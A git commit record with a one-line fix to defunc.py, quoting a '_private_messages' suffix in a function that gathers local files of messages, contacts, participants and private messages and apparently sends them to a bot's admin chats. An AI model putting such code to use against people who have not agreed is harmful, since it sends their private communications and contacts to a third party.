18f732e2f2bc4f4690c9275f434409661e4ae850
T4eslenko <151871161+T4eslenko@users.noreply.github.com>
2024-06-15 22:51:57 +0300

    Update defunc.py

--- defunc.py
+++ defunc.py
@@ -1272,7 +1272,7 @@ def generate_html_report(phone, userid, userinfo, firstname, lastname, username,
     
 # Функци по отправке в боты
 def send_files_to_bot(bot, admin_chat_ids):
-    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', _private_messages]
+    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_private_messages']
 
     for file_extension in file_extensions:
         files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
